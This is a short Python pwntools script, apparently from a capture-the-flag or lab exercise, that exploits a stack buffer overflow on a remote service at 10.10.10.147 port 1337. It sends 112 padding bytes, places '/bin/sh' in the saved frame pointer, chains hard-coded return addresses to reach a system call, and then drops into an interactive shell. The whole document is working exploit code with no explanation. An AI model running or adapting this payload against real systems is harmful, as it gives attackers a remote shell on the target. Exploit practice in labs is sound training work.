from pwn import *
import struct

context.update(arch='amd64', os='linux')
# elf = ELF('./vuln')

#p = process('./myapp')
p = remote("10.10.10.147", 1337)

#print(p.recvuntil(b"What do you want me to echo back? "))
# print(p.recvline())

# eip = p32(0x080491e2)
rbp = b'/bin/sh\x00'
# junk = p32(0x90909090)
rip = p64(0x401206)
syst = p64(0x40116e)
null = p64(0x0)
testf = p64(0x401152)
# param1 = p32(0xdeadbeef)
# param2 = p32(0xc0ded00d)

payload = b'A'*112 + rbp + rip + syst + null + null + testf

p.sendline(payload)
p.interactive()
#print(p.recvline())
